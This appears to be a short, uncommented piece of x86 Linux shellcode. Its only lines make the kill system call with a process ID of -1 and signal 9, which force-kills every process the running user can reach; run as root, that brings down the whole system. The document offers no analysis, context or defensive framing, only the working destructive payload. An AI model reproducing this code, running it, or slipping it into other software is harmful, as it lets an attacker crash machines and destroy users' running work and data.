global _start
_start: 
    xor ebx, ebx
    mov ecx, ebx
    mul ebx
    mov al, 37
    dec ebx
    mov cl, 9
    int 0x80